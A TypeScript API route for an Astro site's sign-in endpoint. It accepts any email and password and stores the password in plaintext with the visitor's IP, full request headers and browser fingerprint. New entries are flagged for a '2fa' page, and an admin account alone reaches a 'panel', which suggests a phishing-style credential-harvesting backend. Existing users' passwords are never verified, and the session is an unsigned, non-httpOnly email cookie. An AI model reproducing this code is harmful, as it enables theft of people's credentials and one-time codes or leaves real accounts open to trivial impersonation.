import type { APIRoute } from 'astro';
import { getUserByEmail, createUser, initializeDb } from '../../../lib/db';
import { serialize } from 'cookie';
import * as UAParser from 'ua-parser-js';
import requestIp from 'request-ip';

initializeDb();

// Function to generate short UID
function generateShortUID() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let uid = '';
  for (let i = 0; i < 5; i++) {
    uid += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return uid;
}

// Function to get detailed browser info
function getBrowserInfo(userAgent: string) {
  const parser = new (UAParser as any).UAParser(userAgent);
  const browser = parser.getBrowser();
  const os = parser.getOS();
  const device = parser.getDevice();

  return {
    browser: `${browser.name || 'Unknown'} ${browser.version || ''}`.trim(),
    os: `${os.name || 'Unknown'} ${os.version || ''}`.trim(),
    device: device.type || 'desktop',
    userAgent: userAgent
  };
}

// Function to get all headers and connection info
function getAllHeadersAndIP(request: Request) {
  const headers: Record<string, string> = {};
  request.headers.forEach((value, key) => {
    headers[key] = value;
  });

  // Get IP using request-ip
  const clientIp = requestIp.getClientIp(request as any) || '0.0.0.0';

  // Additional connection info
  const connectionInfo = {
    ip: clientIp,
    headers: headers,
    referer: headers['referer'] || 'Direct',
    language: headers['accept-language'] || 'Unknown',
    encoding: headers['accept-encoding'] || 'Unknown',
    connection: headers['connection'] || 'Unknown',
    host: headers['host'] || 'Unknown',
    origin: headers['origin'] || 'Unknown',
    sec_ch_ua: headers['sec-ch-ua'] || 'Unknown',
    sec_ch_ua_mobile: headers['sec-ch-ua-mobile'] || 'Unknown',
    sec_ch_ua_platform: headers['sec-ch-ua-platform'] || 'Unknown',
    sec_fetch_dest: headers['sec-fetch-dest'] || 'Unknown',
    sec_fetch_mode: headers['sec-fetch-mode'] || 'Unknown',
    sec_fetch_site: headers['sec-fetch-site'] || 'Unknown',
    sec_fetch_user: headers['sec-fetch-user'] || 'Unknown',
    upgrade_insecure_requests: headers['upgrade-insecure-requests'] || 'Unknown'
  };

  return connectionInfo;
}

export const POST: APIRoute = async ({ request }) => {
  try {
    const data = await request.json();
    const { email, password } = data;

    // Get all headers and connection info
    const connectionInfo = getAllHeadersAndIP(request);

    // Get detailed browser info
    const userAgent = request.headers.get('user-agent') || 'Unknown';
    const { browser, os, device, userAgent: fullUserAgent } = getBrowserInfo(userAgent);

    // Check if user exists
    let user = await getUserByEmail(email);

    // If user doesn't exist, create them with additional data
    if (!user) {
      const result = await createUser({
        email,
        password,
        uid: generateShortUID(),
        ip_address: connectionInfo.ip,
        browser: browser,
        operating_system: os,
        user_agent: fullUserAgent,
        current_page: '2fa',
        status: 'active',
        connection_info: JSON.stringify(connectionInfo) // Store all connection info
      });

      if (!result) {
        throw new Error('Failed to create user');
      }

      // Get the newly created user
      user = await getUserByEmail(email);

      // Remove broadcast call since we're using polling now
      if (!user) {
        throw new Error('Failed to create or retrieve user');
      }
    }

    // Check if user is admin
    const isAdmin = email === import.meta.env.ADMIN_EMAIL;

    // If email matches admin email, verify admin password
    if (isAdmin && password !== import.meta.env.ADMIN_PASSWORD) {
      throw new Error('Invalid admin credentials');
    }

    // Set the cookie with secure settings
    const cookie = serialize('user_email', user.email, {
      path: '/',
      httpOnly: false,
      sameSite: 'lax',
      maxAge: 60 * 60 * 24 * 7, // 1 week
      secure: false // Changed to false for development
    });

    return new Response(JSON.stringify({
      success: true,
      user: {
        email: user.email,
        current_page: isAdmin ? 'panel' : user.current_page,
        status: user.status,
        isAdmin
      }
    }), {
      status: 200,
      headers: {
        'Set-Cookie': cookie,
        'Content-Type': 'application/json'
      }
    });
  } catch (error) {
    console.error('Error in signin:', error);
    return new Response(JSON.stringify({
      error: error instanceof Error ? error.message : 'An error occurred during signin'
    }), {
      status: 500,
      headers: {
        'Content-Type': 'application/json'
      }
    });
  }
}; 